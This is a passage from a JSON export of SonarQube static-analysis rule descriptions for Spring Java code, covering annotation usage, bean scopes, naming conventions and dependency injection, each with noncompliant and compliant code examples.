removed","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Classes annotated as <code>@Controller</code> in Spring are responsible for handling incoming web requests. When annotating methods or the entire\ncontroller with <code>@ResponseBody</code>, the return value of said methods will be serialized and set as the response body. In other words, it tells\nthe Spring framework that this method does not produce a view. This mechanism is commonly used to create API endpoints.</p>\n<p>Spring provides <code>@RestController</code> as a convenient annotation to replace the combination of <code>@Controller</code> and\n<code>@ResponseBody</code>. The two are functionally identical, so the single annotation approach is preferred.</p>\n<p>This rule will raise an issue on a class that is annotated with <code>@Controller</code> if:</p>\n<ul>\n  <li> the class is also annotated with <code>@ResponseBody</code> or </li>\n  <li> all methods in said class are annotated with <code>@ResponseBody</code>. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Replace the <code>@Controller</code> annotation with the <code>@RestController</code> annotation and remove all <code>@ResponseBody</code>\nannotations from the class and its methods.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Controller\n@ResponseBody\npublic class MyController {\n    @GetMapping(\"/hello\")\n    public String hello() {\n        return \"Hello World!\";\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@RestController\npublic class MyController {\n    @GetMapping(\"/hello\")\n    public String hello() {\n        return \"Hello World!\";\n    }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@Controller\npublic class MyController {\n    @ResponseBody\n    @GetMapping(\"/hello\")\n    public String hello() {\n        return \"Hello World!\";\n    }\n\n    @ResponseBody\n    @GetMapping(\"/foo\")\n    public String foo() {\n        return \"Foo\";\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@RestController\npublic class MyController {\n    @GetMapping(\"/hello\")\n    public String hello() {\n        return \"Hello World!\";\n    }\n\n    @GetMapping(\"/foo\")\n    public String foo() {\n        return \"Foo\";\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Spring Guides - <a href=\"https://spring.io/guides/gs/rest-service/\">Building a RESTful Web Service</a> </li>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/spring-controller-vs-restcontroller\">The Spring @Controller and @RestController Annotations</a>\n  </li>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/spring-request-response-body\">Springâs RequestBody and ResponseBody Annotations</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6833","summary":"\"@Controller\" should be replaced with \"@RestController\"","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>In Spring the scope of a bean defines the lifecycle and visibility of that bean in the Spring container. There are six scopes:</p>\n<ul>\n  <li> <strong>Singleton</strong>: default, one instance per Spring container </li>\n  <li> <strong>Prototype</strong>: a new instance per bean request </li>\n  <li> <strong>Request</strong>: a new instance per HTTP request </li>\n  <li> <strong>Session</strong>: a new instance per HTTP session </li>\n  <li> <strong>Application</strong>: a new instance per ServletContext </li>\n  <li> <strong>Websocket</strong>: a new instance per Websocket session </li>\n</ul>\n<p>The last four scopes mentioned, request, session, application and websocket, are only available in a web-aware application.</p>\n<h2>Why is this an issue?</h2>\n<p>In Spring, singleton beans and their dependencies are initialized when the application context is created.</p>\n<p>If a <code>Singleton</code> bean depends on a bean with a shorter-lived scope (like <code>Request</code> or <code>Session</code> beans), it retains\nthe same instance of that bean, even when new instances are created for each Request or Session. This mismatch can cause unexpected behavior and bugs,\nas the Singleton bean doesnât interact correctly with the new instances of the shorter-lived bean.</p>\n<p>This rule raises an issue when non-singleton beans are injected into a singleton bean.</p>\n<h3>What is the potential impact?</h3>\n<p>When a <code>Singleton</code> bean has a dependency on a bean with a shorter-lived scope, it can lead to the following issues:</p>\n<ul>\n  <li> <strong>Data inconsistency</strong>: any state change in the shorter-lived bean will not be reflected in the Singleton bean. </li>\n  <li> <strong>Incorrect behavior</strong>: using the same instance of the shorter-lived bean, when a new instance is supposed to be created for each\n  new request or session. </li>\n  <li> <strong>Memory leaks</strong>: preventing garbage collection of a shorter-lived bean that allocates a significant amount of data over time.\n  </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Inject a shorter-lived bean into a <code>Singleton</code> bean using <strong>ApplicationContext</strong>, <strong>Factories</strong> or\n<strong>Providers</strong>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>When a <code>Singleton</code> bean auto-wires a <code>Request</code> bean, the dependency is resolved at instantiation time and thus the same\ninstance is used for each HTTP request.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Component\n@Scope(value = WebApplicationContext.SCOPE_REQUEST, proxyMode = ScopedProxyMode.TARGET_CLASS)\npublic class RequestBean {\n    //...\n}\n\npublic class SingletonBean {\n    @Autowired\n    private final RequestBean requestBean; // Noncompliant, the same instance of RequestBean is used for each HTTP request.\n\n    public RequestBean getRequestBean() {\n        return requestBean;\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>Instead, use a <code>ObjectFactory&lt;RequestBean&gt;</code>, <code>ObjectProvider&lt;RequestBean&gt;</code>, or\n<code>Provider&lt;RequestBean&gt;</code> as injection point (as for <a\nhref=\"https://docs.spring.io/spring-framework/reference/core/beans/standard-annotations.html#beans-inject-named\">JSR-330</a>).</p>\n<p>Such a dependency is resolved at runtime, allowing for actual injection of a new instance of the shorter-lived bean on each HTTP request.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Component\n@Scope(value = WebApplicationContext.SCOPE_REQUEST, proxyMode = ScopedProxyMode.TARGET_CLASS)\npublic class RequestBean {\n    //...\n}\n\npublic class SingletonBean {\n    private final ObjectFactory&lt;RequestBean&gt; requestBeanFactory;\n\n    @Autowired\n    public SingletonBean(ObjectFactory&lt;RequestBean&gt; requestBeanFactory) {\n        this.requestBeanFactory = requestBeanFactory;\n    }\n\n    public RequestBean getRequestBean() {\n        return requestBeanFactory.getObject();\n    }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>When a <code>Singleton</code> bean auto-wires a <code>Prototype</code> bean, the dependency is resolved at instantiation time and thus the same\ninstance is used for each bean request.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@Component\n@Scope(\"prototype\")\npublic class PrototypeBean {\n    public Object execute() {\n      //...\n    }\n}\n\npublic class SingletonBean {\n    private PrototypeBean prototypeBean;\n\n    @Autowired\n    public SingletonBean(PrototypeBean prototypeBean) { // Noncompliant, the same instance of PrototypeBean is used for each bean request.\n      this.prototypeBean = prototypeBean;\n    }\n\n    public Object process() {\n        return prototypeBean.execute();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>Using the <code>ApplicationContext</code> to retrieve a new instance of a <code>Prototype</code> bean on each bean request.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@Component\n@Scope(\"prototype\")\npublic class PrototypeBean {\n    public Object execute() {\n      //...\n    }\n}\n\npublic class SingletonBean implements ApplicationContextAware {\n    private ApplicationContext applicationContext;\n\n    @Autowired\n    public SingletonBean(ApplicationContext applicationContext) {\n      this.applicationContext = applicationContext;\n    }\n\n    public Object process() {\n        PrototypeBean prototypeBean = createPrototypeBean();\n        return prototypeBean.execute();\n    }\n\n    protected PrototypeBean createPrototypeBean() {\n        return this.applicationContext.getBean(\"prototypeBean\", PrototypeBean.class);\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Framework - <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/factory-scopes.html\">Factory Scopes</a> </li>\n  <li> Spring Framework - <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/standard-annotations.html#beans-inject-named\">Beans\n  Inject Named</a> </li>\n  <li> Spring Framework - <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/dependencies/factory-method-injection.html\">Method\n  Injection</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/spring-bean-scopes\">Spring Bean Scopes</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6832","summary":"Non-singleton Spring beans should not be injected into singleton beans","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Spring Framework, the <code>@Qualifier</code> annotation is typically used to disambiguate between multiple beans of the same type when\nauto-wiring dependencies. It is not necessary to use <code>@Qualifier</code> when defining a bean using the <code>@Bean</code> annotation because the\nbeanâs name can be explicitly specified using the <code>name</code> attribute or derived from the method name. Using <code>@Qualifier</code> on\n<code>@Bean</code> methods can lead to confusion and redundancy. Beans should be named appropriately using either the <code>name</code> attribute of\nthe <code>@Bean</code> annotation or the method name itself.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Configuration\npublic class MyConfiguration {\n  @Bean\n  @Qualifier(\"myService\")\n  public MyService myService() {\n    // ...\n    return new MyService();\n  }\n\n  @Bean\n  @Qualifier(\"betterService\")\n  public MyService aBetterService() {\n    // ...\n    return new MyService();\n  }\n\n  @Bean\n  @Qualifier(\"evenBetterService\")\n  public MyService anEvenBetterService() {\n    // ...\n    return new MyService();\n  }\n\n  @Bean\n  @Qualifier(\"differentService\")\n  public MyBean aDifferentService() {\n    // ...\n    return new MyBean();\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Configuration\npublic class MyConfiguration {\n  @Bean\n  public MyService myService() {\n    // ...\n    return new MyService();\n  }\n\n  @Bean(name=\"betterService\")\n  public MyService aBetterService() {\n    // ...\n    return new MyService();\n  }\n\n  @Bean(name=\"evenBetterService\")\n  public MyService anEvenBetterService() {\n    // ...\n    return new MyService();\n  }\n\n  @Bean(name=\"differentService\")\n  public MyBean aDifferentService() {\n    // ...\n    return new MyBean();\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/java/bean-annotation.html\">Spring Framework - Using the @Bean\n  Annotation</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/annotation-config/autowired-qualifiers.html\">Spring Framework - Using\n  @Qualifier</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-qualifier-annotation\">Baeldung - Spring @Qualifier Annotation</a> </li>\n  <li> <a href=\"https://www.baeldung.com/spring-bean-annotations\">Baeldung - Spring Bean Annotations</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"},{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6831","summary":"\"@Qualifier\" should not be used on \"@Bean\" methods","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"DISTINCT","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Consistent naming of beans is important for the readability and maintainability of the code. More precisely, according to the Spring\ndocumentation:</p>\n<pre>\nNaming beans consistently makes your configuration easier to read and understand. Also, if you use Spring AOP, it helps a lot when applying advice to a set of beans related by name.\n</pre>\n<p>Not following accepted conventions can introduce inconsistent naming, especially when multiple developers work on the same project, leading to\ntechnical debt.</p>\n<p>The spring documentation establishes a naming convention that consists of camel-cased names with a leading lowercase letter.</p>\n<p>This rule raises an issue when a bean name defined in one of the following annotations does not adhere to the naming convention:</p>\n<ul>\n  <li> <code>@Bean</code> </li>\n  <li> <code>@Configuration</code> </li>\n  <li> <code>@Controller</code> </li>\n  <li> <code>@Component</code> </li>\n  <li> <code>@Qualifier</code> </li>\n  <li> <code>@Repository</code> </li>\n  <li> <code>@Service</code> </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Change the beanâs name to adhere to the naming conventions. Names should be camel-cased and start with a lowercase letter, for example,\n<code>myBean</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Bean(name = \"MyBean\") // Noncompliant, the first letter of the name should be lowercase\npublic MyBean myBean() {\n    ...\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Bean(name = \"myBean\") // Compliant\npublic MyBean myBean() {\n    ...\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@Service(\"my_service\") // Noncompliant, the name should be camel-cased\npublic class MyService {\n    ...\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@Service(\"myService\") // Compliant\npublic class MyService {\n    ...\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Framework Documentation - <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/definition.html#beans-beanname\">3.3 Bean\n  overview</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Java Guides - <a href=\"https://www.javaguides.net/2019/03/spring-boot-best-practices.html\">Spring Boot Best Practices</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6830","summary":"Bean names should adhere to the naming conventions","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>The <code>@Autowired</code> annotation in Spring is used for automatic dependency injection. It allows Spring to resolve and inject the required\nbeans into your bean. For example to inject a <code>@Repository</code> object into a <code>@Service</code>.</p>\n<h2>Why is this an issue?</h2>\n<p>The Spring dependency injection mechanism cannot identify which constructor to use for auto-wiring when multiple constructors are present in a\nclass. This ambiguity can cause the application to crash at runtime, and it makes the code less clear to understand and more complex to extend and\nmaintain.</p>\n<h3>What is the potential impact?</h3>\n<ul>\n  <li> <strong>incorrect instantiation</strong>: the wrong constructor is selected for instantiation, leading to a bean not being correctly\n  initialized. </li>\n  <li> <strong>unsatisfied dependency exception</strong>: the constructor selected by Spring requires beans that are not available in the Spring\n  context. </li>\n  <li> <strong>non-deterministic behavior</strong>: the constructor selected by Spring can vary, based on the number of dependencies that can be\n  satisfied at runtime, leading to unpredictable application behavior. </li>\n  <li> <strong>maintainability issues</strong>: adding more constructors in the future could lead to further confusion and potential bugs. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Use the <code>@Autowired</code> annotation to specify which constructor to use for auto-wiring.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Component\npublic class ExampleClass { // Noncompliant: multiple constructors present and no @Autowired annotation to specify which one to use\n\n    private final DependencyClass1 dependency1;\n\n    public ExampleClass() {\n        throw new UnsupportedOperationException(\"Not supported yet.\");\n    }\n\n    public ExampleClass(DependencyClass1 dependency1) {\n        this.dependency1 = dependency1;\n    }\n\n    // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Component\npublic class ExampleClass {\n\n    private final DependencyClass1 dependency1;\n\n    public ExampleClass() {\n        throw new UnsupportedOperationException(\"Not supported yet.\");\n    }\n\n    @Autowired\n    public ExampleClass(DependencyClass1 dependency1) {\n        this.dependency1 = dependency1;\n    }\n\n    // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring - <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/annotation-config/autowired.html\">Annotation Config:\n  Autowired</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Java Guides - <a href=\"https://www.javaguides.net/2023/08/unsatisfieddependencyexception-in.html\">UnsatisfiedDependencyException in Spring\n  Boot</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"},{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6829","summary":"\"@Autowired\" should be used when multiple constructors are provided","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p><code>@Autowired</code> is an annotation in the Spring Framework for automatic dependency injection. It tells Spring to automatically provide the\nrequired dependencies (such as other beans or components) to a classâs fields, methods, or constructors, allowing for easier and more flexible\nmanagement of dependencies in a Spring application. In other words, it is a way to wire up and inject dependencies into Spring components\nautomatically, reducing the need for manual configuration and enhancing modularity and maintainability.</p>\n<p>In any bean class, only one constructor is permitted to declare <code>@Autowired</code> with the <code>required</code> attribute set to true. This\nsignifies the constructor to be automatically wired when used as a Spring bean. Consequently, when the required attribute remains at its default value\n(true), only a singular constructor can bear the <code>@Autowired</code> annotation. In cases where multiple constructors have this annotation, they\nmust all specify <code>required=false</code> to be eligible as candidates for auto-wiring.</p>\n<h2>How to fix it</h2>\n<p>To maintain code clarity and ensure that the Spring context can create beans correctly, have only one constructor annotated with\n<code>@Autowired</code> within a Spring component or set <code>required = false</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Component\npublic class MyComponent {\n  private final MyService myService;\n\n  @Autowired\n  public MyComponent(MyService myService) {\n    this.myService = myService;\n    // ...\n  }\n\n  @Autowired  // Noncompliant\n  public MyComponent(MyService myService, Integer i) {\n    this.myService = myService;\n    // ...\n  }\n\n  @Autowired  // Noncompliant\n  public MyComponent(MyService myService, Integer i, String s) {\n    this.myService = myService;\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Component\npublic class MyComponent {\n  private final MyService myService;\n\n  @Autowired\n  public MyComponent(MyService myService) {\n    this.myService = myService;\n    // ...\n  }\n\n  public MyComponent(MyService myService, Integer i) {\n    this.myService = myService;\n    // ...\n  }\n\n  public MyComponent(MyService myService, Integer i, String s) {\n    this.myService = myService;\n    // ...\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@Component\npublic class MyComponent {\n  private final MyService myService;\n\n  @Autowired\n  public MyComponent(MyService myService) {\n    this.myService = myService;\n    // ...\n  }\n\n  @Autowired  // Noncompliant\n  public MyComponent(MyService myService, Integer i) {\n    this.myService = myService;\n    // ...\n  }\n\n  @Autowired  // Noncompliant\n  public MyComponent(MyService myService, Integer i, String s) {\n    this.myService = myService;\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@Component\npublic class MyComponent {\n  private final MyService myService;\n\n  @Autowired\n  public MyComponent(MyService myService) {\n    this.myService = myService;\n    // ...\n  }\n\n  @Autowired(required=false)  // Compliant\n  public MyComponent(MyService myService, Integer i) {\n    this.myService = myService;\n    // ...\n  }\n\n  @Autowired(required=false)  // Compliant\n  public MyComponent(MyService myService, Integer i, String s) {\n    this.myService = myService;\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/annotation-config/autowired.html\">Spring Framework - Using @Autowired</a>\n  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-autowire\">Baeldung - Guide to Spring @Autowired</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"},{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6818","summary":"\"@Autowired\" should only be used on a single constructor","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p><code>@Configuration</code> is a class-level annotation indicating that an object is a source of bean definitions. <code>@Configuration</code>\nclasses declare beans through <code>@Bean</code>-annotated methods. Calls to <code>@Bean</code> methods on <code>@Configuration</code> classes can\nalso be used to define inter-bean dependencies. The <code>@Bean</code> annotation indicates that a method instantiates, configures, and initializes a\nnew object to be managed by the Spring IoC container.</p>\n<p>Annotating a method of a bean with <code>@Async</code> will make it execute in a separate thread. In other words, the caller will not wait for the\ncompletion of the called method.</p>\n<p>The <code>@Async</code> annotation is not supported on methods declared within a <code>@Configuration</code> class. This is because\n<code>@Async</code> methods are typically used for asynchronous processing, and they require certain infrastructure to be set up, which may not be\navailable or appropriate in a <code>@Configuration</code> class.</p>\n<h2>How to fix it</h2>\n<p>Donât use <code>@Async</code> annotations on methods of <code>@Configuration</code> classes.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@EnableAsync\n@Configuration\npublic class MyConfiguration {\n\n  @Async // Noncompliant - This is not allowed\n  public void asyncMethod() {\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@EnableAsync\n@Configuration\npublic class MyConfiguration {\n\n  public void method() {\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/scheduling/annotation/Async.html\">Spring\n  Framework - @Async</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/java/configuration-annotation.html\">Spring Framework - Using the\n  @Configuration annotation</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/java/basic-concepts.html\">Spring Framework - Basic Concepts: @Bean and\n  @Configuration</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-async\">Baeldung - How To Do @Async in Spring</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6817","summary":"Use of the \"@Async\" annotation on methods declared within a \"@Configuration\" class in Spring Boot","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>SpEL, the Spring Expression Languages allows developers fine-grained control over the values injected into fields and parameters. Using the\n<code>@Value</code> annotation, it is possible to inject values from sources such as system properties.</p>\n<h2>Why is this an issue?</h2>\n<p>The <code>@Value</code> annotation does not guarantee that the property is defined. Particularly if a field or parameter is annotated as nullable,\nit indicates that the developer assumes that the property may be undefined.</p>\n<p>An undefined property may lead to runtime exceptions when the Spring framework tries to inject the autowired dependency during bean creation.</p>\n<p>This rule raises an issue when a nullable field or parameter is annotated with <code>@Value</code> and no default value is provided.</p>\n<h2>How to fix it</h2>\n<p>Add a default value to the <code>@Value</code> annotation. A default value can be supplied by using the colon (<code>:</code>) operator. As the\nfield is nullable, the default value should most likely be <code>#{null}</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Nullable\n@Value(\"${my.property}\") // Noncompliant, no default value is provided, even though the field is nullable\nprivate String myProperty;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Nullable\n@Value(\"${my.property:#{null}}\") // Compliant, a default value is provided\nprivate String myProperty;\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/spring-value-defaults\">Using Spring @Value With Defaults</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6816","summary":"Nullable injected fields and parameters should provide a default value","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Spring provides two options to mark a REST parameter as optional:</p>\n<ol>\n  <li> Use <code>required = false</code> in the <code>@PathVariable</code> or <code>@RequestParam</code> annotation of the respective method parameter\n  or </li>\n  <li> Use type <code>java.util.Optional&lt;T&gt;</code> for the method parameter </li>\n</ol>\n<p>When using 1., the absence of the parameter, when the REST function is called, is encoded by <code>null</code>, which can only be used for object\ntypes. If <code>required = false</code> is used for a parameter with a primitive and the REST function is called without the parameter, a runtime\nexception occurs because the Spring data mapper cannot map the <code>null</code> value to the parameter.</p>\n<h2>How to fix it</h2>\n<p>Replace primitive types, such as <code>boolean</code>, <code>char</code>, <code>int</code>, with the corresponding wrapper type, such as\n<code>Boolean</code>, <code>Character</code>, <code>Integer</code>.</p>\n<p>Alternatively, you might choose to remove <code>required = false</code> from the annotation and use an <code>Optional&lt;T&gt;</code> type for the\nparameter, such as <code>Optional&lt;Boolean&gt;</code> or <code>Optional&lt;String&gt;</code>, which automatically makes the REST parameter optional.\nThis is the preferred approach because it enforces the proper handling of <code>null</code> in the method implementation.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@RequestMapping(value = {\"/article\", \"/article/{id}\"})\npublic Article getArticle(@PathVariable(required = false) int articleId) { // Noncompliant, null cannot be mapped to int\n   //...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@RequestMapping(value = {\"/article\", \"/article/{id}\"})\npublic Article getArticle(@PathVariable(required = false) Integer articleId) { // Compliant\n   //...\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@RequestMapping(value = {\"/article\", \"/article/{id}\"})\npublic Article getArticle(@PathVariable(required = false) int articleId) { // Noncompliant, null cannot be mapped to int\n   //...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@RequestMapping(value = {\"/article\", \"/article/{id}\"})\npublic Article getArticle(@PathVariable Optional&lt;Integer&gt; articleId) { // Compliant and preferred approach\n   //...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/PathVariable.html\">Spring\n  Framework API - Annotation Interface PathVariable</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-optional-path-variables\">Baeldung - Spring Optional Path Variables</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6814","summary":"Optional REST parameters should have an object type","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"10.3.0.82913","communityVersion":"10.3.0.82913"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Dependency injection frameworks such as Spring, Quarkus, and others support dependency injection by using annotations such as <code>@Inject</code>\nand <code>@Autowired</code>. These annotations can be used to inject beans via constructor, setter, and field injection.</p>\n<p>Generally speaking, field injection is discouraged. It allows the creation of objects in an invalid state and makes testing more difficult. The\ndependencies are not explicit when instantiating a class that uses field injection.</p>\n<p>In addition, field injection is not compatible with final fields. Keeping dependencies immutable where possible makes the code easier to\nunderstand, easing development and maintenance.</p>\n<p>Finally, because values are injected into fields after the object has been constructed, they cannot be used to initialize other non-injected fields\ninline.</p>\n<p>This rule raises an issue when the <code>@Autowired</code> or <code>@Inject</code> annotations are used on a field.</p>\n<h2>How to fix it</h2>\n<p>Use constructor injection instead.</p>\n<p>By using constructor injection, the dependencies are explicit and must be passed during an objectâs construction. This avoids the possibility of\ninstantiating an object in an invalid state and makes types 